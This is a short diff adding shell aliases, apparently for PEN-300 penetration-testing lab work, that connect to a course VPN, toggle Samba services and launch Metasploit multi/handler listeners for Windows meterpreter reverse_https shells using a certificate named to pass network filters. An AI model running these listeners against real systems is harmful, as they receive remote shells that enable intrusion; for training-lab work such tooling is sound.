@@ -1,0 +1,5 @@
+alias vpn='sudo openvpn --config ~/PEN-300/VPN/universal.ovpn'
+alias start-smb='sudo systemctl start smbd && sudo systemctl start nmbd' 
+alias stop-smb='sudo systemctl stop smbd && sudo systemctl stop nmbd'
+alias c2-win64-https='sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set HandlerSSLCert /home/kali/PEN-300/Network Filters/defender.pem; set SSLVERSION TLS1.2; set LHOST 192.168.45.229; set LPORT 443; set EXITFUNC thread; exploit"'
+alias c2-win32-https='sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set HandlerSSLCert /home/kali/PEN-300/Network Filters/defender.pem; set SSLVERSION TLS1.2; set LHOST 192.168.45.229; set LPORT 443; set EXITFUNC thread; exploit"'
